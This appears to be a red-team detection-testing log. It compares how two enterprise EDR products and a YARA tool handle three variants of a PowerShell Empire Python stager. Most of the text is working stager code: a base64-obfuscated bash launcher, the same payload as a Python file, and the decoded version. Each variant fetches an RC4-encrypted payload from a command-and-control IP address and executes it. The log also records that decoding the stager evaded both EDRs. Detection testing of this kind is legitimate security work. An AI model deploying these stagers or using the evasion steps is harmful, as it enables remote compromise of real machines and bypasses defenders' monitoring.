**Detections**

* Enterprise EDR Solution 1: Yes (Blocked)
* Enterprise EDR Solution 2: Yes (Blocked)
* Enterprise YARA Solution: Yes

Enterprise EDR Solution 1 and 2 stopped/killed an [empire](https://github.com/BC-SECURITY/Empire) bash stager that I just created.


`#!/bin/bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHVybGxpYi5yZXF1ZXN0OwpVQT0nTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28nO3NlcnZlcj0naHR0cDovLzM0LjIyNy4xNDIuMjIyOjQ0Myc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJzsKcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3Qoc2VydmVyK3QpOwpwcm94eSA9IHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliLnJlcXVlc3QuYnVpbGRfb3BlbmVyKHByb3h5KTsKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLFVBKSwgKCJDb29raWUiLCAic2Vzc2lvbj0wODZVeFpWMU5TWTVYUkJHRU9YajgrbmVLbzA9IildOwp1cmxsaWIucmVxdWVzdC5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07CmRhdGE9YVs0Ol07CmtleT1JVisnVXllOn5manhWc2wjKyw9LzdQd0VbQDE1a09NYzJKYjsnLmVuY29kZSgnVVRGLTgnKTsKUyxqLG91dD1saXN0KHJhbmdlKDI1NikpLDAsW107CmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgICBqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwppPWo9MDsKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2OwogICAgaj0oaitTW2ldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwogICAgb3V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKTsKZXhlYygnJy5qb2luKG91dCkpOw=='));" | python3 &
rm -f ""
exit`

Hashes:
b2e9bedf88360cf61594598cf20c7cf40a98ddff2710334f8c0740ad27ada92f  emp.sh

***

**Detections**
* Enterprise EDR Solution 1: Yes (Blocked)
* Enterprise EDR Solution 2: No
* Enterprise YARA Solution: Yes

Enterprise EDR Solution 1 still detected after a small change in the python Empire stager. Instead of a bash script piping code to python, wrote a python script with the content.


`import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHVybGxpYi5yZXF1ZXN0OwpVQT0nTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28nO3NlcnZlcj0naHR0cDovLzM0LjIyNy4xNDIuMjIyOjQ0Myc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJzsKcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3Qoc2VydmVyK3QpOwpwcm94eSA9IHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliLnJlcXVlc3QuYnVpbGRfb3BlbmVyKHByb3h5KTsKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLFVBKSwgKCJDb29raWUiLCAic2Vzc2lvbj0wODZVeFpWMU5TWTVYUkJHRU9YajgrbmVLbzA9IildOwp1cmxsaWIucmVxdWVzdC5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07CmRhdGE9YVs0Ol07CmtleT1JVisnVXllOn5manhWc2wjKyw9LzdQd0VbQDE1a09NYzJKYjsnLmVuY29kZSgnVVRGLTgnKTsKUyxqLG91dD1saXN0KHJhbmdlKDI1NikpLDAsW107CmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgICBqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwppPWo9MDsKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2OwogICAgaj0oaitTW2ldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwogICAgb3V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKTsKZXhlYygnJy5qb2luKG91dCkpOw=='));`
  
And ran it with python 

`python e.py`

Hashes:

bfb56965013ff50fe7f3fb241d66754126204aefd1d235fe5fcdff9b2f0e2c40  e.py


***


**Detections**
* Enterprise EDR Solution 1: No
* Enterprise EDR Solution 2: No
* Enterprise YARA Solution: Yes

Decoded the base64 content of the previous script and directly ran that. 

`import sys;
import urllib.request;
UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://34.227.142.222:443';t='/login/process.php';
req=urllib.request.Request(server+t);
proxy = urllib.request.ProxyHandler();
o = urllib.request.build_opener(proxy);
o.addheaders=[('User-Agent',UA), ("Cookie", "session=086UxZV1NSY5XRBGEOXj8+neKo0=")];
urllib.request.install_opener(o);
a=urllib.request.urlopen(req).read();
IV=a[0:4];
data=a[4:];
key=IV+'Uye:~fjxVsl#+,=/7PwE[@15kOMc2Jb;'.encode('UTF-8');
S,j,out=list(range(256)),0,[];
for i in list(range(256)):
    j=(j+S[i]+key[i%len(key)])%256;
    S[i],S[j]=S[j],S[i];
i=j=0;
for char in data:
    i=(i+1)%256;
    j=(j+S[i])%256;
    S[i],S[j]=S[j],S[i];
    out.append(chr(char^S[(S[i]+S[j])%256]));
exec(''.join(out));%`

Ran it with:

`python decoded.py`

Hashes:

02467783ba9854ed652d7e1737f86cdcf89b54b522c609f2e0600ce4f3bb24e7  decoded.py